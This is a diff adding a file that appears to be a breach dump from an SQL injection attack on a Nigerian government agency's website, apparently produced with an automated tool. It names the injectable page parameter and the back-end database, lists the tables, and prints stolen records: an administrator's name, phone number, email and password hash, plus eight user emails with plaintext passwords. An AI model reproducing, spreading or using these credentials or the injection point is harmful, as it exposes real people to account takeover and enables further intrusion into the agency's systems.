@@ -1,0 +1,48 @@
+.gov government
+
+.ng Nigeria
+
+Lower Niger River Basin Development Authority, a Parastatal of the Federal Ministry of Water Resources
+
+http://www.lnrbda.gov.ng/readnews.php?id=1
+
+the back-end DBMS: MySQL >= 5.0.12 (Percona fork)
+
+available databases [2]:                                                                                                                                             
+[*] information_schema
+[*] lnrbda
+
+Database: lnrbda                                                                                                                                                     
+[5 tables]
++----------------+
+| applicant_info |
+| gyes_user      |
+| news           |
+| tuser          |
+| validation     |
++----------------+
+
+Database: lnrbda
+Table: tuser
+[1 entry]
++-------------+----------------+----------+-----------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Phone       | FullName       | UserName | Email                       | Password                                                                                                                                                                     |
++-------------+----------------+----------+-----------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 08101344908 | Adedoyin Shina | admin    | dynamicinfotech13@gmail.com | eea44564ab6b541929f896ec2a48a559cb8d0405c19fb43d2926a7a90790cc1cfe8106f8b7d41ed4bd336a669ecc97ff17e552075d62c403efd3615a94bffe26VRobTbZV3kicUDaE5x4o5ZLfjr4UUaSxiOwbuaTxo70= |
++-------------+----------------+----------+-----------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: lnrbda                                                                                                                                                     
+Table: gyes_user
+[8 entries]
++----------------------------------+-------------------+
+| email                            | passw             |
++----------------------------------+-------------------+
+| rafsonjani441@gmail.com          | eletrical28484eee |
+| owokunlebolajisulayman@gmail.com | owokunle90        |
+| akomolafe.s.stephen123@gmail.com | 123               |
+| omeiza1000@gmail.com             | mustyaski1        |
+| akogunabdulgafar@gmail.com       | oladimeji99       |
+| olaideasiyanbi@gmal.com          | alake1884         |
+| sosimplycutiez@gmail.com         | 859542            |
+| oluwaseyiolapade31@gmail.com     | 07011983036       |
++----------------------------------+-------------------+
